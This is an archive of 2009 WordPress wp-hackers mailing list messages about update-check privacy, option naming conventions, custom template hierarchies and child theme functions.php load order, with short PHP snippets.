	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com> 
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com> 
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com> 
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>
Message-ID: <427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>

2009/12/10 Doug Stewart <zamoose at gmail.com>

> On Wed, Dec 9, 2009 at 7:20 PM, Lynne Pope <lynne.pope at gmail.com> wrote:
>
> >
> > It is not necessary to collect information about plugins and themes that
> > are
> > external to the repository. There is no valid reason for descriptions to
> be
> > collected. Each update query sends the IP address which is, itself, a
> > unique
> > identifier - associating the blog URL to the rest of the data is
> > unnecessary.
> >
> >
> I agree with most of your points except for this one. Shared hosts share
> IPs
> as well as hardware in many cases.
>
> Or, in my case, my multiple domains all share the same IP address, so you
> DO
> need to provide something a bit more specific than IP in order to ensure
> true uniqueness.
>

I agree IF a unique key is necessary in order to collect anonymous,
aggregated data. I'm not convinced it is.

Lynne

From mikeschinkel at newclarity.net  Thu Dec 10 02:42:12 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 9 Dec 2009 21:42:12 -0500
Subject: [wp-hackers] template_redirect vs. single_template vs. other?
	(was $wp_rewrite->add_permstruct() vs. add_rewrite_rule())
In-Reply-To: <161617690912081154o24129d41n4b14d358d7aca808@mail.gmail.com>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
	<161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com>
	<D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>
	<161617690912081154o24129d41n4b14d358d7aca808@mail.gmail.com>
Message-ID: <501100F9-DC27-4422-9622-3BBDB6849EA8@newclarity.net>

On Dec 8, 2009, at 2:54 PM, Otto wrote:
> Well, it depends on what exactly you want to do. Hard to say without
> knowing that, precisely.
> 
> You'd use template_loader when you want to bypass the templates system
> altogether. Basically, templates are all the files in the theme
> hierarchy. Single.php, page,php, category-x.php, archive.php, etc. All
> these templates can be overriden directly, of course, so
> template_loader is for when you want to go completely outside the
> norm.
> 
> For the *_templates, the actual filter is performed on
> {$type}_template, where type is the argument to get_query_template. So
> you can override any of them. 404, author, archive, date, paged,
> search, single, attachment, and any mime type attachments (text/plain
> would be "text" and "plain" and "text_plain", image/gif would be
> "image", then "gif", then "image_gif", etc...). So it's pretty wide
> open there.
> 
> Which branch of the hierarchy is examined depends on the contents of
> the $wp_query. If is_single gets set (because you got a single post),
> then it goes to the single branch first, etc.
> 
> In essence, you need to determine three things.
> 1. What do the URLs look like?
> 2. What posts should be pulled?
> 3. What template file should be loaded?
> 
> Each of these will be handled separately, however some of them can be
> skipped or made simpler if there's already support in WordPress for
> that specific case. In the case of "pulling one and only one post",
> then wp_query can already do that (by setting the %post_id%), and the
> single branch of the template hierarchy handles that just fine.

That is really, really good and awfully useful, and couldn't find anywhere else. 
Add to the Codex somewhere?

> In the case of pulling, say, custom post types, then it's a tad more
> complicated.

What about it is more complex?  I haven't found that yet.

-Mike

From wp-hackers at striderweb.com  Thu Dec 10 03:40:54 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 9 Dec 2009 21:40:54 -0600
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <4B1FCDFE.2070802@gunters.org>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<4B1FCDFE.2070802@gunters.org>
Message-ID: <443794B8-19A0-4E34-A9C3-A9A594CB0C91@striderweb.com>


On Dec 9, 2009, at 10:19 AM, Dougal Campbell wrote:

> In a nutshell, my proposal was going to be that we use a naming convention like: [area]:[slug]:[name]
> 
> For example, if you had a plugin named "Tweet Fu" (which has the slug 'tweet-fu' in the respository), you might have an option named: plugin:tweet-fu:last_tweet_timestamp
> 
> Or if you have a theme that saves its own option: theme:my-theme-name:header_image_filename
> 
> Basically, area is the "realm" of the option, like 'plugin', 'theme', 'core', etc., and slug is generally the plugin or theme nicename (or a placeholder like '_wp_' or '_transient_' for core options).

I do almost exactly that in a tutorial I wrote a while back:

***quote***
First off, let's decide what to call our new single setting. We might just go with ?shrinkylink?, or ?shrinkylink_settings?, but part of the point of this exercise is to keep the options table tidy; and in the interests of clarity, I'd like to go the further step of specifying in the option name that it was made by a plugin. Let's use ?plugin_shrinkylink_settings".
***end quote***

On Dec 9, 2009, at 12:43 PM, Otto wrote:

> Generally speaking, most plugins should be using a single option
> holding an array of their settings. I tend to go with
> pluginname-options, personally.
> 
> Any "standard" should take this into account, as keeping every option
> in a separate row can be bad practice.

Heh.  And that's what the tutorial was showing authors how to do!  ;-)

<http://striderweb.com/nerdaphernalia/2008/07/consolidate-options-with-arrays/>

Stephen




-- 
Stephen Rider
http://striderweb.com/


From lynne.pope at gmail.com  Thu Dec 10 08:44:13 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 10 Dec 2009 21:44:13 +1300
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <4B1FC578.8010706@gaarai.com>
References: <4B1FC578.8010706@gaarai.com>
Message-ID: <427667db0912100044q26286a2cheec205baa66ff80a@mail.gmail.com>

I like this idea very much. +100 from me.

Lynne


2009/12/10 Chris Jean <gaarai at gaarai.com>

> I thought of including this in my response to the main topic, but it would
> just get lost in there.
>
> At some point in the conversation, the idea of sharing plugin data for all
> plugins and not just plugins from the repo was shared. I pondered on this
> for a bit, and I think I have a good solution to this problem.
>
> To me, the only solution for plugin updates is for the server to send what
> it has since any other option would be highly-inefficient or very error
> prone. So, why not add the ability for a plugin to opt out of having its
> information included in the update request? This should only require a
> minimal change to the update code and won't require any changes to the
> update servers.
>
> Here's an example of what such a privacy entry would look like in a plugin:
>
> Plugin Name: Internal Plugin
> Plugin URI: http://itsasecret.com/
> Description: This is not just a plugin, it symbolizes the plans and secrets
> of an entire corporation summed up in a plugin name.
> Author: Bernard Madoff
> Version: 7.2.1
> Author URI: http://thisisalsoasecret.com/
> Disable Updates: yes
>
> Of course, the exact phrase to use is open to discussion. I just wanted to
> introduce the idea.
>
> If people like this idea, I can work on a patch to put on trac.
>
> --
> Chris Jean
> http://gaarai.com/
> @chrisjean
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://twitter.com/elpie/

From otto at ottodestruct.com  Thu Dec 10 15:45:07 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 10 Dec 2009 09:45:07 -0600
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <443794B8-19A0-4E34-A9C3-A9A594CB0C91@striderweb.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com> 
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<4B1FCDFE.2070802@gunters.org> 
	<443794B8-19A0-4E34-A9C3-A9A594CB0C91@striderweb.com>
Message-ID: <161617690912100745y53bdca3du92d6d0597f6d4bac@mail.gmail.com>

On Wed, Dec 9, 2009 at 9:40 PM, Stephen Rider <wp-hackers at striderweb.com> wrote:
> Heh. ?And that's what the tutorial was showing authors how to do! ?;-)
>
> <http://striderweb.com/nerdaphernalia/2008/07/consolidate-options-with-arrays/>

Hey, you're not the only person who can write a tutorial, bub! :)
http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/

-Otto

From otto at ottodestruct.com  Thu Dec 10 16:10:19 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 10 Dec 2009 10:10:19 -0600
Subject: [wp-hackers] template_redirect vs. single_template vs. other?
	(was $wp_rewrite->add_permstruct() vs. add_rewrite_rule())
In-Reply-To: <501100F9-DC27-4422-9622-3BBDB6849EA8@newclarity.net>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net> 
	<161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com> 
	<D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>
	<161617690912081154o24129d41n4b14d358d7aca808@mail.gmail.com> 
	<501100F9-DC27-4422-9622-3BBDB6849EA8@newclarity.net>
Message-ID: <161617690912100810w1234ea0as939efb035e654b95@mail.gmail.com>

On Wed, Dec 9, 2009 at 8:42 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> That is really, really good and awfully useful, and couldn't find anywhere else.
> Add to the Codex somewhere?

Feel free to add it if you like. Might want to explain it better than I can. :)

>> In the case of pulling, say, custom post types, then it's a tad more
>> complicated.
>
> What about it is more complex? ?I haven't found that yet.

For custom post types, in 2.8 there was no real support for them in the query.

2.9 adds that support, but doesn't create a rewrite tag for them. This
actually isn't difficult to do, you can use add_rewrite_tag to do it.
That will let you use the %post_type% as an identifier in a
permastruct. It also lets the post_type get defined in the query,
which (in 2.9) will cause the query to filter on your custom post
type.

Example (off the top of my head, might need editing):

add_rewrite_tag('%post_type%','.*');
$wp_query->add_permastruct('post-type','/type/%post_type%');

I think adding that on init should allow URLs of /type/custom to pull
up posts with "custom" in their post_type. You'd have to flush the
rewrite rules first, of course.

However, none of this gives you a special template hierarchy
automatically. These types of URLs would fall into the normal
"is_archive" hierarchy (the default hierarchy for "multiple posts to
display"), since there's no tests for your custom tag, unlike the
built-in tags. See http://codex.wordpress.org/Template_Hierarchy

So to create a special template hierarchy, you could either a) hook to
the template_redirect or b) hook to the archive_template. In either
case, you'd want to look at $wp_query->post_type and detect your
custom types there, in order to select the correct template to use in
the theme.

Just to pick one, if you were to hook to archive_template, you could
create a simple hierarchy like so:

add_filter('archive_template','my_hierarchy');
function my_hierarchy($template) {
  global $wp_query;
  if (empty($wp_query->post_type) return $template; // no post type,
don't bother going on
  $hierarchy = array ("{$wp_query->post_type}.php", "archive.php");
  return locate_template ($hierarchy);
}

This would let a custom post type (say, "custom") have its own theme
templates (say, "custom.php").

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Thu Dec 10 16:16:01 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 10 Dec 2009 10:16:01 -0600
Subject: [wp-hackers] template_redirect vs. single_template vs. other?
	(was $wp_rewrite->add_permstruct() vs. add_rewrite_rule())
In-Reply-To: <161617690912100810w1234ea0as939efb035e654b95@mail.gmail.com>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net> 
	<161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com> 
	<D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>
	<161617690912081154o24129d41n4b14d358d7aca808@mail.gmail.com> 
	<501100F9-DC27-4422-9622-3BBDB6849EA8@newclarity.net>
	<161617690912100810w1234ea0as939efb035e654b95@mail.gmail.com>
Message-ID: <161617690912100816o29f9a796gb66db0a828173ae2@mail.gmail.com>

On Thu, Dec 10, 2009 at 10:10 AM, Otto <otto at ottodestruct.com> wrote:
> Example (off the top of my head, might need editing):
>
> add_rewrite_tag('%post_type%','.*');
> $wp_query->add_permastruct('post-type','/type/%post_type%');

Like I said, off the top of my head. That should be
$wp_rewrite->add_permastruct, of course.

-Otto
Sent from Memphis, TN, United States

From dougal at gunters.org  Thu Dec 10 17:17:07 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Thu, 10 Dec 2009 12:17:07 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <161617690912100745y53bdca3du92d6d0597f6d4bac@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>	<4B1FCDFE.2070802@gunters.org>
	<443794B8-19A0-4E34-A9C3-A9A594CB0C91@striderweb.com>
	<161617690912100745y53bdca3du92d6d0597f6d4bac@mail.gmail.com>
Message-ID: <4B212D13.50601@gunters.org>

On Dec 10 2009 10:45 AM, Otto wrote:
> On Wed, Dec 9, 2009 at 9:40 PM, Stephen Rider<wp-hackers at striderweb.com>  wrote:
>    
>> Heh.  And that's what the tutorial was showing authors how to do!  ;-)
>>
>> <http://striderweb.com/nerdaphernalia/2008/07/consolidate-options-with-arrays/>
>>      
> Hey, you're not the only person who can write a tutorial, bub! :)
> http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/
>    

Oh, and for the five of you who might be interested, I've published my 
post on the subject:

   http://dougal.gunters.org/blog/2009/12/10/wordpress-option-namespacing

I'm updating it after-the-fact with links to you guys' articles.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From otto at ottodestruct.com  Thu Dec 10 20:15:11 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 10 Dec 2009 14:15:11 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com> 
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com> 
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com> 
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com> 
	<427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>
Message-ID: <161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>

Just wanted to add that there's been a plugin to "anonymize" the
plugin updater in the plugin repository for over two years:

http://wordpress.org/extend/plugins/anonymous-wordpress-plugin-updates/

Still hasn't broken 2000 downloads, oddly enough. Doesn't seem to be a
particularly desirable feature in that respect.

-Otto

From Ken at adcSTUDIO.com  Thu Dec 10 20:30:29 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Thu, 10 Dec 2009 15:30:29 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>
	<427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>
	<161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
Message-ID: <4B215A65.7030108@adcSTUDIO.com>

Some sort of acknowledgment on install (or download, or included text 
file, whatever) is fine, but opting out of security updates shouldn't be 
allowed. They can do the work of finding a plugin for that or not use 
wordpress; security is too important to let them shoot themselves in the 
foot with a built in option. Explain what it is and that its not really 
optional.

  As far as usage statistics and what not (php, mysql, wp versions, 
stuff useful for targeted development), an option for that (like when 
downloading chrome or whatever) seems reasonable, provided it explains 
what and why. I send "annonymous" statistics to google, I don't mind, 
tho it likely should be voluntary. (Perhaps usage statistics would show 
a better current version percentage this way ;-) )

From lynne.pope at gmail.com  Thu Dec 10 20:53:01 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Fri, 11 Dec 2009 09:53:01 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com> 
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com> 
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com> 
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com> 
	<427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com> 
	<161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
Message-ID: <427667db0912101253s78213ca7t8f99ae2409d3ba2f@mail.gmail.com>

In my experience few people will use a plugin that hasn't been updated in 2
years and which says its compatible up to a version that was outdated 2
years ago so its not surprising that this plugin is not better supported.

Regardless, plugins do not address the problem of WordPress sending data
without users being (a) aware of what is sent and (b) opting in.

Lynne

2009/12/11 Otto <otto at ottodestruct.com>

> Just wanted to add that there's been a plugin to "anonymize" the
> plugin updater in the plugin repository for over two years:
>
> http://wordpress.org/extend/plugins/anonymous-wordpress-plugin-updates/
>
> Still hasn't broken 2000 downloads, oddly enough. Doesn't seem to be a
> particularly desirable feature in that respect.
>
> -Otto
>

From esmi at quirm.net  Thu Dec 10 21:17:34 2009
From: esmi at quirm.net (esmi at quirm dot net)
Date: Thu, 10 Dec 2009 21:17:34 +0000
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912101253s78213ca7t8f99ae2409d3ba2f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>
	<427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>
	<161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
	<427667db0912101253s78213ca7t8f99ae2409d3ba2f@mail.gmail.com>
Message-ID: <4B21656E.3000008@quirm.net>

on 10/12/2009 20:53 Lynne Pope said the following:
<snip>
> Regardless, plugins do not address the problem of WordPress sending data
> without users being (a) aware of what is sent and (b) opting in.

And purely FYI:

http://wordpress.org/support/topic/339721?replies=3

--
esmi


From zamoose at gmail.com  Fri Dec 11 01:32:57 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 10 Dec 2009 20:32:57 -0500
Subject: [wp-hackers] Child theme functions.php & processing order
Message-ID: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>

Howdy all. I need a gentle shove in the right direction on this one.

When processing a child theme, which ends up getting executed by  
WordPress first, the child or the parent functions.php?  And, parallel  
to this, if I have action or filter hooks registered in the parent,  
what's the best way to ensure that my child theme can override/alter  
the parent's functions?

--
Doug Stewart
@zamoose
http://literalbarrage.org/blog/

From ian at themeshaper.com  Fri Dec 11 01:54:55 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Thu, 10 Dec 2009 19:54:55 -0600
Subject: [wp-hackers] Child theme functions.php & processing order
In-Reply-To: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
References: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
Message-ID: <a8405fa30912101754m34444a11k7c392a6e64a896f8@mail.gmail.com>

If you've got action hooks you can use remove_action at init like so ?

function remove_foo() {
 remove_action('some_hook','some_action',optional-postition-number-if-there-is-one);
}
add_action('init','remove_foo');

? in your Child Theme's functions file.

On Thu, Dec 10, 2009 at 7:32 PM, Doug Stewart <zamoose at gmail.com> wrote:

> Howdy all. I need a gentle shove in the right direction on this one.
>
> When processing a child theme, which ends up getting executed by WordPress
> first, the child or the parent functions.php?  And, parallel to this, if I
> have action or filter hooks registered in the parent, what's the best way to
> ensure that my child theme can override/alter the parent's functions?
>
> --
> Doug Stewart
> @zamoose
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From kikizas at gmail.com  Fri Dec 11 02:36:49 2009
From: kikizas at gmail.com (Demetris)
Date: Fri, 11 Dec 2009 04:36:49 +0200
Subject: [wp-hackers] Child theme functions.php & processing order
In-Reply-To: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
References: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
Message-ID: <9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>

On Fri, Dec 11, 2009 at 3:32 AM, Doug Stewart <zamoose at gmail.com> wrote:
> Howdy all. I need a gentle shove in the right direction on this one.
>
> When processing a child theme, which ends up getting executed by WordPress
> first, the child or the parent functions.php? ?And, parallel to this, if I
> have action or filter hooks registered in the parent, what's the best way to
> ensure that my child theme can override/alter the parent's functions?
>
Answering to the first question:

The child?s functions.php is executed first.

I would expect it to be the other way around.  (But I have no idea if
it matters. For example, when both parent and child register one
function or filter each to the same hook, the order can be adapted
with the priority argument. But probably there are scenarios that I?m
missing.)

Cheers!

Demetris
http://op111.net/

From wp-hackers at striderweb.com  Fri Dec 11 04:39:06 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 10 Dec 2009 22:39:06 -0600
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <4B1FC578.8010706@gaarai.com>
References: <4B1FC578.8010706@gaarai.com>
Message-ID: <4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>


On Dec 9, 2009, at 9:42 AM, Chris Jean wrote:

> [W]hy not add the ability for a plugin to opt out of having its information included in the update request? This should only require a minimal change to the update code and won't require any changes to the update servers.
> 
> Here's an example of what such a privacy entry would look like in a plugin:
> 
> Plugin Name: Internal Plugin
> Plugin URI: http://itsasecret.com/
> Description: This is not just a plugin, it symbolizes the plans and secrets of an entire corporation summed up in a plugin name.
> Author: Bernard Madoff
> Version: 7.2.1
> Author URI: http://thisisalsoasecret.com/
> Disable Updates: yes
> 
> Of course, the exact phrase to use is open to discussion.

A decent idea, but...

1) If using a new header, I think we should *not* use a "yes to a no".  That is, the header should be "Updates:", and you set it "no" to turn it off.

2) Personally I think this is more of a plugin area.  "Disable Plugin Update Checks" could allow you to turn checks off entirely, or toggle checks on a plugin by plugin basis by modifying the array that is sent to the server.

Personally I FAR prefer #2.  New headers should be rare, and this doesn't seem like a best case for that.  I think this could be done very nicely with a (not too complicated!) plugin, and I think that's what it should be.

3) If a particular plugin for some reason shouldn't be auto-updated, I believe the plugin can remove itself from the update array.  I confused at the concept of a particular plugin being concerned for privacy for just its own use.  Again, #2 makes more sense to me.

Stephen




-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Fri Dec 11 04:57:41 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 10 Dec 2009 22:57:41 -0600
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <4B212D13.50601@gunters.org>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>	<4B1FCDFE.2070802@gunters.org>
	<443794B8-19A0-4E34-A9C3-A9A594CB0C91@striderweb.com>
	<161617690912100745y53bdca3du92d6d0597f6d4bac@mail.gmail.com>
	<4B212D13.50601@gunters.org>
Message-ID: <7CA7AC4A-3F69-49F6-A3F0-89C8EFE29DB4@striderweb.com>


On Dec 10, 2009, at 11:17 AM, Dougal Campbell wrote:

> On Dec 10 2009 10:45 AM, Otto wrote:
>> On Wed, Dec 9, 2009 at 9:40 PM, Stephen Rider<wp-hackers at striderweb.com>  wrote:
>>   
>>> Heh.  And that's what the tutorial was showing authors how to do!  ;-)
>>> 
>>> <http://striderweb.com/nerdaphernalia/2008/07/consolidate-options-with-arrays/>
>>>     
>> Hey, you're not the only person who can write a tutorial, bub! :)
>> http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/
>>   
> 
> Oh, and for the five of you who might be interested, I've published my post on the subject:
> 
>  http://dougal.gunters.org/blog/2009/12/10/wordpress-option-namespacing
> 
> I'm updating it after-the-fact with links to you guys' articles.

Dougal -- I saw that today and commented.

Otto -- Yeah, mine predates yours by over a year.  You show the new and improved way -- mine covers old and inferior.  Hmm... time to update my articles!  ;-)

Actually, when I next update my plugins I will definitely be paying some attention to your post.  I've had it bookmarked for a while now.

Stephen

-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Fri Dec 11 05:02:41 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 10 Dec 2009 23:02:41 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912101253s78213ca7t8f99ae2409d3ba2f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
	<71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>
	<427667db0912091826r67b100c1td0a56fe35ba93353@mail.gmail.com>
	<161617690912101215g5af30adna2c89e700878eb0f@mail.gmail.com>
	<427667db0912101253s78213ca7t8f99ae2409d3ba2f@mail.gmail.com>
Message-ID: <45AF87F8-BE08-4EF0-BB89-865E293F93D0@striderweb.com>


On Dec 10, 2009, at 2:53 PM, Lynne Pope wrote:

> Regardless, plugins do not address the problem of WordPress sending data
> without users being (a) aware of what is sent and (b) opting in.

To my understanding , the only things really necessary to check for updates is an array of the plugins to be checked, and some sort of unique site identifier.  So use a hashed URL for the identifier and we should be fine, Yes?

With opt in, we can include all the other stuff that is now gathered.

Stephen

From ghodmode at ghodmode.com  Fri Dec 11 05:34:44 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Fri, 11 Dec 2009 18:34:44 +1300
Subject: [wp-hackers] Child theme functions.php & processing order
In-Reply-To: <9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>
References: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com>
	<9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>
Message-ID: <4B21D9F4.3070803@ghodmode.com>

On 11/12/09 15:36, Demetris wrote:
> On Fri, Dec 11, 2009 at 3:32 AM, Doug Stewart<zamoose at gmail.com>  wrote:
>    
>> Howdy all. I need a gentle shove in the right direction on this one.
>>
>> When processing a child theme, which ends up getting executed by WordPress
>> first, the child or the parent functions.php?  And, parallel to this, if I
>> have action or filter hooks registered in the parent, what's the best way to
>> ensure that my child theme can override/alter the parent's functions?
>>
>>      
> Answering to the first question:
>
> The child?s functions.php is executed first.
>
> I would expect it to be the other way around.  (But I have no idea if
> it matters. For example, when both parent and child register one
> function or filter each to the same hook, the order can be adapted
> with the priority argument. But probably there are scenarios that I?m
> missing.)
>
> Cheers!
>
> Demetris
> http://op111.net/
>    

I found this related article : 
http://venutip.com/content/right-way-override-theme-functions
And here's the related codex page : 
http://codex.wordpress.org/Theme_Development#Theme_Functions_File

They're loaded from /wp-settings.php around lines 669-672...

> // Load functions for active theme.
> if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists(STYLESHEETPATH . 
> '/functions.php') )
>     include(STYLESHEETPATH . '/functions.php');
> if ( file_exists(TEMPLATEPATH . '/functions.php') )
>     include(TEMPLATEPATH . '/functions.php');
Where TEMPLATEPATH is the parent template's path and STYLESHEETPATH is 
the child template's path (I think :-) )

So, if you have a function in your child template's functions.php that 
has the same name as one from the parent's functions.php, I guess the 
one from the parent is the one that will be used unless you use the 
remove_action() function as Ian suggested.  There's more detail in that 
related article.

I thought it didn't even use the functions.php from the parent if there 
was a functions.php in the child template directory, but I see now that 
I was wrong.

-- 
*Ghodmode*
www.ghodmode.com <http://www.ghodmode.com>

From jayarjo at gmail.com  Fri Dec 11 14:00:54 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 11 Dec 2009 18:00:54 +0400
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
Message-ID: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>

Is there any way to transfer Blog Stats (page hits that is) from
WordPress.com to stand-alone wordpress installation? Is it a plugin of
some kind?

-- 
Davit Barbakadze

From otto at ottodestruct.com  Fri Dec 11 14:02:21 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 11 Dec 2009 08:02:21 -0600
Subject: [wp-hackers] Child theme functions.php & processing order
